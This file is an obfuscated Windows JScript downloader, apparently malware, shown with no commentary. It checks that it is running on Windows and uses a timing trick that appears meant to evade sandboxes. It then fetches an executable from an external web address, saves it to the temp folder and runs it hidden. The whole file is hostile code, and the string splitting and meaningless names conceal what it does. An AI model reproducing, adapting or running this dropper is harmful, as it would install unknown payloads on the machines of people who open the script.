var QR = false;
var RC = "Create"+"Object";
var EU = function NZ() {return WScript[RC]("WScript"+".Shell");}(), F = 11;
var DZ = "MSXML2"+".XMLHTTP";
var N = 2;
var G = N - 2;
function RH(CG){EU["Run"](CG, G, G);};
function J(){return DZ + "";};
function P(CE, T){G = G * 1; return CE - T;};
function RM(){return RC;};
/*@cc_on
  @if (@_win32 || @_win64)
    QR = true;
  @end
@*/
if (QR)
{
var WY = "";
function Z0(){return 22;};
var G0 = 0; var ME = 0;
function CY()
{
var I = new this["Date"]();
var B = I["getUTCMilliseconds"]();
WScript["Sleep"](Z0());
var I = new this["Date"]();
var NA = I["getUTCMilliseconds"]();
WScript["Sleep"](Z0());
var I = new this["Date"]();
var L = I["getUTCMilliseconds"]();
var G0 = "IU";
G0 = P(NA, B);
var ME = "JI";
ME = P(L, NA);
WY = "open";
return P(G0, ME);
}
var U1 = false;
var L0 = false;
for (var K = G; K < Z0() * 1; K++){if (CY() != G){
U1 = true; 
ME = "31" + 11 * G0 + ME; 
L0 = true; 
break;
}}
function EF() {return ((U1 == true) && (U1 == L0)) ? 1 : G;};
if (U1 && EF() && L0){
function LQ() {return EU["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "aWAahiGuo2.ex" + "e";};
 QL = J();
 AS = WScript[RC](QL);
 var IQ = 1;
do { 
	for (;IQ;){
	try {
		if (IQ == 1)
		{
			AS[WY]("GET", "http://grzegorzschreiber.pl/n7dak", false);
			AS["send"]();
			A = "Sleep";
			IQ = 2;
		}
		WScript[A](Z0() + 120); 
		if (AS["readystate"] < 2 * 2) continue;
		IQ = G;
		function Z(U0) {var V = (1, 2, 3, 4, 5, U0); return V;};
		B0 = WScript[RM()]("ADODB.Stream");
		QL = B0;
		QL[WY]();
		QL["type"] = Z(1);
		QL["write"](AS["ResponseBody"]);
		B0["position"] = Z(G);
		QL["Save" + "ToFile"](LQ(), 2);
		B0["cl"+"ose"]();
		U = LQ();
		RH(U);
	} catch(QA){};};
}while (IQ);
}
}

